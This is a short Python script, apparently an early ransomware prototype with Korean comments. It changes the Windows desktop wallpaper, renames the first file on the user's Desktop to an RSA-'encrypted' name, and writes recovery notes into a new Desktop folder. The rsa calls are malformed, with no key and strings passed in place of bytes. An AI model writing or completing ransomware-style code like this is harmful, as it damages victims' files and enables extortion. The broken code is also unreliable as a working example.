import os
import ctypes
import rsa
sf="원래이름.txt"
reset="복구용.txt"
user=os.path.expanduser('~')

print(user)
pathh=os.getcwd()
ctypes.windll.user32.SystemParametersInfoW(20, 0, f"{pathh}\\pic.png" , 3)

#바탕화면에 이상한 메모장이 나오면 삭제할수도 있으니 디렉토리를
#설정해줘서 삭제 왠만하면 안하게 할거임
try:
    os.makedirs(f'{user}//Desktop//testff')
except FileExistsError:
    pass





rand=f'{user}//Desktop//testff//{sf}'
resets=f'{user}//Desktop//testff//{reset}'


def find_file():
    filenames = os.listdir("C:\\Users\\User\\Desktop")
    filenames.sort()
    print (filenames)
    if len(filenames)==0:
        print ("no file")
    else:
        global new_name
        before=str(filenames[0])
        new_name=rsa.encrypt(filenames[0])
        os.rename(f'{user}\\Desktop\\{before}',f'{user}\\Desktop\\{new_name}')
        with open(rand,'w') as f:
            f.write(rsa.decrypt(new_name))
        
        #rep=ord(new_name)
        with open(resets,'w') as f:
            f.write(str(new_name))

    

find_file()